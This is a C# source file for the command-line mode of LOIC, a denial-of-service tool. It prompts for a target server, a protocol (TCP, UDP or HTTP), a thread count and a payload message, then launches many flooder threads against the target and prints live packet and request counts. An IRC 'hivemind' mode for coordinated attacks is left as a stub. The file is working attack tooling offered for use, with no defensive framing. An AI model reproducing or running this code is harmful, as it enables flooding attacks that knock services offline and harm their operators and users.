using System;
using System.Net;
using System.Threading;
namespace LOIC
{
	public class CLI
	{
		private XXPFlooder[] xxp;
		private HTTPFlooder[] http;
		private string host, ip, data;
		private int port, proto, threads, delay, timeout;
		private bool resp, rand;
		
		public CLI (bool hive, string ircserver, string ircport, string ircchannel)
		{
			if (hive) {
				// Doe met de hive connecten
				// enzo
			} else {
				// Doe info vragen.
				Console.WriteLine("Manual mode initialized.\n" +
					"To use hivemind in CLI, use LOIC /cli /hivemind <server> [port] [channel]");
				
				Console.Write("Server address and port [server:port]: ");
				string[] target = Console.ReadLine().Split(':');
				host = target[0].ToLower();
				port = Convert.ToInt32(target[1]);
				
				if (host.StartsWith("https://")) host = host.Replace("https://", "http://");
	            else if (!host.StartsWith("http://")) host = String.Concat("http://", host);
	            try { ip = Dns.GetHostEntry(new Uri(host).Host).AddressList[0].ToString(); }
	            catch
	            {
	                Console.WriteLine("The URL you entered does not resolve to an IP!");
					return;
	            }
				
				do {
					Console.WriteLine("1 TCP\n2 UDP\n3 HTTP");
					Console.Write("Choose a protocol: ");
					try { proto = Convert.ToInt32(Console.ReadLine()); } catch (Exception) {proto = -1;}
					if (proto < 1 || proto > 3) Console.WriteLine("1, 2 or 3, Derpface!");
				} while (proto < 1 || proto > 3);
				
				Console.Write("Number of threads: ");
				threads = Convert.ToInt32(Console.ReadLine());
				
				Console.Write("Delay (0-20): ");
				delay = Convert.ToInt32(Console.ReadLine());
				
				Console.Write("Wait for response? (Y/n): ");
				resp = !Console.ReadLine().Equals("n", StringComparison.CurrentCultureIgnoreCase);
				
				Console.Write("Message or subsite: ");
				data = Console.ReadLine();
				
				Console.Write("Append random characters? (Y/n): ");
				rand = !Console.ReadLine().Equals("n", StringComparison.CurrentCultureIgnoreCase);//Catch.

				if (proto == 3) {
					//HTTP.
					Console.Write("Timeout: ");
					timeout = Convert.ToInt32(Console.ReadLine());
					http = new HTTPFlooder[threads];
                    for (int a = 0; a < http.Length; a++)
                    {
                        http[a] = new HTTPFlooder(host, ip, port, data, resp, delay, timeout, rand);
                        http[a].Start();
                    }
					Console.WriteLine("Idle\tConnecting\tRequesting\tDownloading\tDownloaded\tRequested\tFailed\n");
				} else {
					xxp = new XXPFlooder[threads];
					for (int i = 0; i < xxp.Length; i++) {
						xxp[i] = new XXPFlooder(ip, port, proto, delay, resp, data, rand);
						xxp[i].Start();
					}
					Console.WriteLine("Packets sent\n");
				}
				
				new Timer(new TimerCallback(timerCallback), null, 0, 10);
				
				
				while (!Console.ReadLine().Equals("stop", StringComparison.CurrentCultureIgnoreCase));
			}
		}
		
		private void timerCallback(object sender) {
			int top = Console.CursorTop;
			int left = Console.CursorLeft;
			Console.SetCursorPosition(0, top - 1);
			if (proto == 1 || proto == 2) {
				int iFloodCount = 0;
				for (int a = 0; a < xxp.Length; a++)
				{
					iFloodCount += xxp[a].FloodCount;
				}
				Console.Write(iFloodCount);
			} else { // HTTP, duhrr
				int iIdle = 0;
				int iConnecting = 0;
				int iRequesting = 0;
				int iDownloading = 0;
				int iDownloaded = 0;
				int iRequested = 0;
				int iFailed = 0;

				for (int a = 0; a < http.Length; a++)
				{
					iDownloaded += http[a].Downloaded;
					iRequested += http[a].Requested;
					iFailed += http[a].Failed;
					if (http[a].State == HTTPFlooder.ReqState.Ready ||
						http[a].State == HTTPFlooder.ReqState.Completed)
						iIdle++;
					if (http[a].State == HTTPFlooder.ReqState.Connecting)
						iConnecting++;
					if (http[a].State == HTTPFlooder.ReqState.Requesting)
						iRequesting++;
					if (http[a].State == HTTPFlooder.ReqState.Downloading)
						iDownloading++;
					if (!http[a].IsFlooding)
					{
						int iaDownloaded = http[a].Downloaded;
						int iaRequested = http[a].Requested;
						int iaFailed = http[a].Failed;
						http[a] = null;
						http[a] = new HTTPFlooder(host, ip, port, data, resp, delay, timeout, rand);
						http[a].Downloaded = iaDownloaded;
						http[a].Requested = iaRequested;
						http[a].Failed = iaFailed;
						http[a].Start();
					}
				}
				Console.WriteLine(iIdle + "\t" + iConnecting + "\t" + iRequesting + "\t" + iDownloading + "\t"
				                  + iDownloaded + "\t" + iRequested + "\t" + iFailed);
			}
			Console.SetCursorPosition(left, top);
		}
	}
}

